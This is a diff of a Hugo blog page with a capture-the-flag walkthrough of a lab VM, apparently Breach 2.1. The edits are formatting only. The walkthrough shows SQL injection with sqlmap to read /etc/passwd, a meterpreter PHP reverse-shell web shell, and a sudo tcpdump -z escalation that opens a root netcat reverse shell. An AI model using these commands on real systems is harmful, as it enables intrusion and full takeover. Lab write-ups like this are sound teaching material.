@@ -38,7 +38,8 @@
   
   
 
-  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  
+
   <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
   <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
 
@@ -50,7 +51,7 @@
   
   <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
 
-  <meta name="generator" content="Hugo 0.18.1" />
+  <meta name="generator" content="Hugo 0.37.1" />
   <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
   
   
@@ -143,28 +144,26 @@ The VM is configured with a static IP address (192.168.110.151) so you will need
 <p>The VM is configured to the IP address 192.168.110.151.
 Let&rsquo;s start by scanning the target via nmap.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ nmap -n -Pn -sS -p- -sV -iL scope -v --open --script <span class="s2">&quot;http-title or default&quot;</span> -oA target_<span class="k">$(</span>date <span class="s2">&quot;+%Y-%m-%d&quot;</span><span class="k">)</span>
-<span class="c1"># Nmap 7.40 scan initiated Wed Mar  8 16:26:50 2017 as: nmap -n -Pn -sS -p- -sV -iL scope -v --open --script http-title or default -oA target_2017-03-08</span>
-Nmap scan report <span class="k">for</span> <span class="m">192</span>.168.110.151
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -n -Pn -sS -p- -sV -iL scope -v --open --script <span class="s2">&#34;http-title or default&#34;</span> -oA target_<span class="k">$(</span>date <span class="s2">&#34;+%Y-%m-%d&#34;</span><span class="k">)</span>
+<span class="c1"># Nmap 7.40 scan initiated Wed Mar  8 16:26:50 2017 as: nmap -n -Pn -sS -p- -sV -iL scope -v --open --script http-title or default -oA target_2017-03-08
+</span><span class="c1"></span>Nmap scan report <span class="k">for</span> <span class="m">192</span>.168.110.151
 Host is up <span class="o">(</span><span class="m">0</span>.00011s latency<span class="o">)</span>.
 Not shown: <span class="m">65532</span> closed ports
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT      STATE SERVICE VERSION
-<span class="m">111</span>/tcp   open  rpcbind <span class="m">2</span>-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
-<span class="p">|</span> rpcinfo:
+<span class="m">111</span>/tcp   open  rpcbind <span class="m">2</span>-4 <span class="o">(</span>RPC <span class="c1">#100000)
+</span><span class="c1"></span><span class="p">|</span> rpcinfo:
 <span class="p">|</span>   program version   port/proto  service
 <span class="p">|</span>   <span class="m">100000</span>  <span class="m">2</span>,3,4        <span class="m">111</span>/tcp  rpcbind
 <span class="p">|</span>   <span class="m">100000</span>  <span class="m">2</span>,3,4        <span class="m">111</span>/udp  rpcbind
 <span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          <span class="m">51603</span>/udp  status
 <span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          <span class="m">54935</span>/tcp  status
-<span class="m">54935</span>/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c1">#100024)</span>
-<span class="m">65535</span>/tcp open  ssh     OpenSSH <span class="m">6</span>.7p1 Debian <span class="m">5</span>+deb8u2 <span class="o">(</span>protocol <span class="m">2</span>.0<span class="o">)</span>
+<span class="m">54935</span>/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c1">#100024)
+</span><span class="c1"></span><span class="m">65535</span>/tcp open  ssh     OpenSSH <span class="m">6</span>.7p1 Debian <span class="m">5</span>+deb8u2 <span class="o">(</span>protocol <span class="m">2</span>.0<span class="o">)</span>
 <span class="p">|</span> ssh-hostkey:
 <span class="p">|</span>   <span class="m">1024</span> f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 <span class="o">(</span>DSA<span class="o">)</span>
 <span class="p">|</span>   <span class="m">2048</span> 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 <span class="o">(</span>ECDSA<span class="o">)</span>
-</code></pre></div>
-
+<span class="p">|</span>_  <span class="m">256</span> c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 <span class="o">(</span>ECDSA<span class="o">)</span></code></pre></div>
 
 <p>The one luring target is the ssh on port 65535/tcp.
 Let&rsquo;s try and connect to it with <code>ssh 192.168.110.151 -p 65535</code>.</p>
@@ -200,16 +199,14 @@ The banner also mentions a blog that Peter is slacking on.
 Maybe we missed something, so better scan again and this time slowly.
 With <code>ndiff</code> we can compare the results.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>-Not shown: <span class="m">65532</span> closed ports
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">-Not shown: <span class="m">65532</span> closed ports
 +Not shown: <span class="m">65531</span> closed ports
  PORT   STATE SERVICE VERSION
 +80/tcp open  http    Apache httpd <span class="m">2</span>.4.10 <span class="o">((</span>Debian<span class="o">))</span>
 +<span class="p">|</span>  http-methods:
 +<span class="p">|</span>_   Supported Methods: GET HEAD POST OPTIONS
 +<span class="p">|</span>_ http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
-+<span class="p">|</span>_ http-title: Initech Cyber Consulting, LLC
-</code></pre></div>
-
++<span class="p">|</span>_ http-title: Initech Cyber Consulting, LLC</code></pre></div>
 
 <p>That is interesting, maybe the SSH login triggered the port to open?
 Let&rsquo;s see for ourselves.</p>
@@ -239,17 +236,15 @@ Let&rsquo;s see for ourselves.</p>
 <p>Nothing here.
 Maybe we can find some files and directories on the web server via gobuster.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">$</span> gobuster -u http://192.168.110.151 -w /usr/share/seclists/Discovery/Web_Content/raft-large-files.txt -e -r -l
-<span class="go">=====================================================</span>
-<span class="go">http://192.168.110.151/index.html (Status: 200) [Size: 468]</span>
-<span class="go">http://192.168.110.151/. (Status: 200) [Size: 468]</span>
-<span class="go">=====================================================</span>
-<span class="gp">$</span> gobuster -u http://192.168.110.151 -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e -r -l -f
-<span class="go">=====================================================</span>
-<span class="go">http://192.168.110.151/blog/ (Status: 200) [Size: 5600]</span>
-<span class="go">=====================================================</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ gobuster -u http://192.168.110.151 -w /usr/share/seclists/Discovery/Web_Content/raft-large-files.txt -e -r -l
+=====================================================
+http://192.168.110.151/index.html (Status: 200) [Size: 468]
+http://192.168.110.151/. (Status: 200) [Size: 468]
+=====================================================
+$ gobuster -u http://192.168.110.151 -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e -r -l -f
+=====================================================
+http://192.168.110.151/blog/ (Status: 200) [Size: 5600]
+=====================================================</code></pre></div>
 
 <p>There is Peter&rsquo;s blog!
 What might be hidden behind this URL.</p>
@@ -267,9 +262,7 @@ What might be hidden behind this URL.</p>
 <p>This is not wordpress, it is rather a random php blogging application.
 Intuition automatically spawns an <code>sqlmap</code> instance.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">$</span> sqlmap --forms --batch --crawl <span class="m">4</span> -u http://192.168.110.151/blog/index.php
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap --forms --batch --crawl 4 -u http://192.168.110.151/blog/index.php</code></pre></div>
 
 
 
@@ -318,16 +311,12 @@ Yet, on port 80 there is no os-commerce web shop.
 Let&rsquo;s try to find out a little bit more about the system.
 First, let&rsquo;s take a look at the user accounts of the system.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">$</span> sqlmap --batch -u http://192.168.110.151/blog/index.php?search<span class="o">=</span>asdf --file-read /etc/passwd
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap --batch -u http://192.168.110.151/blog/index.php?search=asdf --file-read /etc/passwd</code></pre></div>
 
 <p>With the information from <code>/etc/passwd</code> other possible attack vectors are to perform a brute-force attack on the ssh service.
 Also, the table blogphp_stats seems to contain a log of the web application.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">$</span> sqlmap -u http://192.168.110.151/blog/index.php?search<span class="o">=</span>asdf -D blog -T blogphp_stats --count --dump --stop <span class="m">99</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u http://192.168.110.151/blog/index.php?search=asdf -D blog -T blogphp_stats --count --dump --stop 99</code></pre></div>
 
 <p>The most intriguing part is, that another IP address is also browsing the blog regularly.
 This might be Peter slacking at work!
@@ -469,7 +458,7 @@ Looking back at Milton&rsquo;s best scenes the answer is quite obvious.</p>
 
 
 <div style="position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;">
-  <iframe src="//www.youtube.com/embed/pHHZBmF8mk4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" allowfullscreen frameborder="0"></iframe>
+  <iframe src="//www.youtube.com/embed/pHHZBmF8mk4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" allowfullscreen frameborder="0" title="YouTube Video"></iframe>
  </div>
 
 
@@ -477,7 +466,7 @@ Looking back at Milton&rsquo;s best scenes the answer is quite obvious.</p>
 Let&rsquo;s check the running services, maybe another one is activated after a successful login.
 After a quick nmap scan we can compare the results and check for changes.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="m">192</span>.168.110.151, <span class="m">08</span>:00:27:B0:12:49:
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="m">192</span>.168.110.151, <span class="m">08</span>:00:27:B0:12:49:
 -Not shown: <span class="m">65531</span> closed ports
 +Not shown: <span class="m">65529</span> closed ports
 PORT      STATE SERVICE VERSION
@@ -490,9 +479,7 @@ PORT      STATE SERVICE VERSION
 +<span class="p">|</span>  http-methods:
 +<span class="p">|</span>_   Supported Methods: GET HEAD POST
 +<span class="p">|</span>_ http-server-header: nginx/1.6.2
-+<span class="p">|</span>_ http-title: Index of /
-</code></pre></div>
-
++<span class="p">|</span>_ http-title: Index of /</code></pre></div>
 
 <p>There is another web service available.
 This time even with oscommerce.
@@ -506,22 +493,18 @@ However, trying the default combination admin:admin did grant access to the admi
 We have a winner.
 Just quickly create a meterpreter php payload that can be uploaded to the web server.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="c1"># msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.5 LPORT=4444 -f raw -o meterpreter.php</span>
-No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.5 LPORT=4444 -f raw -o meterpreter.php
+</span><span class="c1"></span>No platform was selected, choosing Msf::Module::Platform::PHP from the payload
 No Arch selected, selecting Arch: php from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: <span class="m">949</span> bytes
-Saved as: meterpreter.php
-</code></pre></div>
-
+Saved as: meterpreter.php</code></pre></div>
 
 <p>As none of the root folders is writeable there might be one in a subdirectory.
 With some command line kungfu a suitable directory can easily be found.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ find /var/www/html2/oscommerce -perm /o<span class="o">=</span>w
-/var/www/html2/oscommerce/includes/work
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ find /var/www/html2/oscommerce -perm /o<span class="o">=</span>w
+/var/www/html2/oscommerce/includes/work</code></pre></div>
 
 <p>The web shell can be executed by simply browsing to the file.</p>
 
@@ -550,9 +533,7 @@ With some command line kungfu a suitable directory can easily be found.</p>
 <p>Shells spawned from the meterpreter session are lacking the tty.
 A quick fix is to start one with the following python one liner.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>python -c <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s2">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span></code></pre></div>
 
 <p>Already having gathered relevant information about the system there might be some user specific security issue.
 Listing the sudo rights for the users brings one allowed command.</p>
@@ -586,11 +567,9 @@ The manpages do in fact list one option that could help in this precarious situa
 The easiest way is to utilize netcat on the target system, as it supports the execute function.
 Before starting the connection a listener has to be opened on the attcker machine.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ <span class="nb">echo</span> <span class="s2">&quot;nc 192.168.110.5 1234 -e /bin/bash&quot;</span> &gt; /tmp/con.sh
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">echo</span> <span class="s2">&#34;nc 192.168.110.5 1234 -e /bin/bash&#34;</span> &gt; /tmp/con.sh
 $ chmod +x /tmp/con.sh
-$ sudo tcpdump -ln -i eth0 -w /dev/null -W <span class="m">1</span> -G <span class="m">1</span> -z /tmp/con.sh -Z root
-</code></pre></div>
-
+$ sudo tcpdump -ln -i eth0 -w /dev/null -W <span class="m">1</span> -G <span class="m">1</span> -z /tmp/con.sh -Z root</code></pre></div>
 
 <p>The script is executed and netcat connects to the attacking machine.</p>
 
@@ -643,7 +622,7 @@ Win!</p>
 
 <footer>
 
-  <p class="text-muted credit">&copy; 2017. All rights reserved. </p>
+  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>
 
   
   
